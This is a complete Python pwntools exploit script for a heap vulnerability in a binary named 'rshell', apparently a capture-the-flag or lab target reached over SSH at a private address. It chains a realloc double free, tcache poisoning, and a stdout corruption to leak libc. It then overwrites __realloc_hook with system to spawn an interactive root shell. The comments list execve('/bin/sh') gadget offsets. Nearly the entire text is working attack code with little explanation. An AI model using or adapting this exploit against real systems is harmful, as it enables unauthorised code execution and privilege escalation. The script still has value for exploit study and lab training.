#!/usr/bin/env python3

from pwn import *

exe = ELF("./rshell", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.29.so", checksec=False)

context.binary = exe
context.terminal = 'tmux split -h'.split(' ')
# context.log_level = 'debug'

libc_delta = 0x1e7570

"""
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
[rcx] == NULL || rcx == NULL
[[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
[rcx] == NULL || rcx == NULL
[rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
"""

for _ in range(30):
    try:
        if args.REMOTE:
            s = ssh(host='10.10.10.196',
                    user='chromeuser',
                    ssh_agent=True)
            p = s.process('/usr/bin/rshell')
        else:
            p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

            if args.GDB:
                gdb.attach(p, '''
                    brva 0x1a05
                    continue
                    ''')

        def choose(choice):
            p.sendlineafter(b'$ ', choice)

        def alloc(index, size, content):
            choose(f'add {index}'.encode())
            p.sendlineafter(b': ', str(size).encode())
            p.sendlineafter(b': ', content)

        def realloc(index, size, content):
            choose(f'edit {index}'.encode())
            p.sendlineafter(b': ', str(size).encode())
            if size > 0:
                p.sendafter(b': ', content)

        def free(index):
            choose(f'rm {index}'.encode())

        def _list():
            choose(b'ls')

        # 0. Preserve tcache[0x30]

        alloc(0, 0x20, b'A' * 4)
        free(0)

        # 1. Create a double free of chunks with different sizes in tcache

        alloc(0, 0x60, b'A' * 4)
        realloc(0, 0, b'')
        realloc(0, 0x30, b'B' * 4)
        free(0)

        # 2. Allocate 9 * 0x80-byte chunks to fake a unsorted bin size chunk

        for _ in range(9):
            alloc(1, 0x50, b'C' * 4)
            realloc(1, 0x70, b'D' * 4)
            free(1)

        # 3. Send fake chunk to unsorted bin

        alloc(1, 0x20, b'E' * 4)
        realloc(1, 0, b'')
        alloc(0, 0x60, b'F' * 0x38 + p64(0x431))
        free(1)
        free(0)

        # 4. Poison tcache[0x40]

        alloc(0, 0x40, b'')
        realloc(0, 0x40, p16(0x6760))

        # 5. Put stdout into tcache[0x40] head

        alloc(1, 0x20, b'G' * 4)

        # 6. Write at stdout struct

        free(0)

        alloc(0, 0x21, p64(0xfbad1800) + p64(0) * 3)

        # 7. Leak libc address

        data = p.recv(16)

        if data[0] == b'$':
            p.close()
            continue

        libc_leak = u64(data[8:])
        libc.address = libc_leak - libc_delta

        log.info(f'libc_leak = {hex(libc_leak)}')
        log.info(f'libc @ {hex(libc.address)}')
        log.info(f'__realloc_hook @ {hex(libc.sym.__realloc_hook)}')
        
        break
    except:
        p.close()
        continue

# 8. Poison tcache[0x50]

realloc(1, 0x10, b'H' * 4)
free(1)

alloc(1, 0x50, b'I' * 4)
free(1)

alloc(1, 0x70, b'I' * 4)
realloc(1, 0, b'')

realloc(1, 0x10, b'I' * 4)
free(1)

alloc(1, 0x70, b'J' * 0x18 + p64(0x61) + p64(libc.sym.__realloc_hook-8))
realloc(1, 0x40, b'J' * 4)
free(1)

# 9. Write on __realloc_hook

alloc(1, 0x50, b'K' * 4)
realloc(1, 0x10, b'K' * 4)
free(1)

log.info(f'system @ {hex(libc.sym.system)}')

alloc(1, 0x50, b'/bin/sh\x00' + p64(libc.sym.system))

realloc(1, 0, b'')

p.interactive()
